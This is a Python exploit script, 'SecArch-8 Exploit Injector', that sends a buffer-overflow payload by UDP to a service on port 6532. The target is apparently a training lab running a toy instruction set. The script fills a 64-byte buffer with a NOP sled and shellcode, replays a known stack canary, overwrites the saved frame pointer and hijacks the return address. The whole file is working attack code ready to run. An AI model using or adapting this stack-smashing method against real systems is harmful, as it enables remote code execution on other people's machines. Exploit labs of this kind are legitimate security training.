import socket
import struct
import argparse
import sys

# ==========================================
#   SecArch-8: Advanced Exploit Injector
#   Target: UDP Port 0x1984 (6532)
#   Author: [Your Name/GitHub]
# ==========================================

def create_bypass_payload(target_ret_addr):
    """
    Constructs a malicious UDP payload designed to:
    1. Deliver executable shellcode (Load ID 2 -> Syscall)
    2. Fill the buffer exactly to the boundary.
    3. 'Repair' the Stack Canary to bypass security checks.
    4. Overwrite the Saved Frame Pointer.
    5. Hijack the Return Address (RIP/EIP).
    """
    
    # --- Architecture Constraints (Must match C++ Struct) ---
    BUFFER_SIZE = 64
    CANARY_VAL  = 0xCAFEBABE
    FRAME_PAD   = 8  # 8 Bytes for Saved RBP (x64 alignment)
    
    # --- 1. The Shellcode ---
    # Opcode 0x43 = LD A, #IMM (Load 0x02)
    # Opcode 0xFF = SYSCALL (Trap)
    shellcode = b'\x43\x02\xFF' 
    
    # --- 2. NOP Sled ---
    # Increases reliability. We jump anywhere here, and the CPU slides to shellcode.
    # We use 32 bytes to leave room for the shellcode within the 64-byte buffer.
    nop_sled = b'\x00' * 32
    
    # Start building the injection block
    payload = bytearray()
    payload.extend(nop_sled)
    payload.extend(shellcode)
    
    # --- 3. Precision Padding ---
    # We must fill the buffer EXACTLY to 64 bytes.
    # If we are short, the canary won't line up. If we are long, we corrupt it.
    current_len = len(payload)
    padding_needed = BUFFER_SIZE - current_len
    
    if padding_needed < 0:
        print(f"[!] Error: Shellcode + Sled exceeds buffer size ({current_len} > {BUFFER_SIZE})")
        sys.exit(1)
        
    print(f"[*] Shellcode: {len(shellcode)}b | Sled: {len(nop_sled)}b | Padding: {padding_needed}b")
    payload.extend(b'A' * padding_needed)
    
    # --- 4. Canary Bypass (The Security Bypass) ---
    # We inject the known canary value (0xCAFEBABE) in Little Endian.
    # This tricks the C++ defense check: `if (canary != 0xCAFEBABE) exit(139);`
    packed_canary = struct.pack('<I', CANARY_VAL)
    payload.extend(packed_canary)
    print(f"[*] Injected Canary: 0x{CANARY_VAL:X}")

    # --- 5. Frame Pointer Overwrite ---
    # Real stack frames usually have a Saved Base Pointer (RBP) here.
    # We overwrite it with junk ('B') to reach the Return Address.
    payload.extend(b'B' * FRAME_PAD)

    # --- 6. Return Address Hijack ---
    # We overwrite the Instruction Pointer (RIP) with our target address.
    # Note: <I is 32-bit unsigned int. Use <Q for native 64-bit pointers if needed.
    packed_ret = struct.pack('<I', target_ret_addr)
    payload.extend(packed_ret)
    
    return payload

def run_exploit(ip, port, ret_addr):
    print(f"--- SecArch-8 Exploit Lab ---")
    print(f"[*] Target: {ip}:{port}")
    print(f"[*] Hijacking RIP to: 0x{ret_addr:X}")
    
    payload = create_bypass_payload(ret_addr)
    
    print(f"[*] Total Payload Size: {len(payload)} bytes")
    print(f"[*] Sending payload...")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(payload, (ip, port))
        print(f"[+] Exploit Sent! If successful, CPU will execute shellcode.")
    except Exception as e:
        print(f"[!] Network Error: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='SecArch-8 Stack Smashing Tool')
    parser.add_argument('--ip', default="127.0.0.1", help='Target IP Address')
    parser.add_argument('--port', type=int, default=6532, help='Target UDP Port (Default: 6532)')
    # Default return address is 0xDEADBEEF for demonstration (Crashing)
    # To actually run code, this should be the address of the buffer/NOP sled.
    parser.add_argument('--ret', type=lambda x: int(x, 0), default=0xDEADBEEF, help='Target Return Address (Hex, e.g., 0xDEADBEEF)')
    
    args = parser.parse_args()

    run_exploit(args.ip, args.port, args.ret)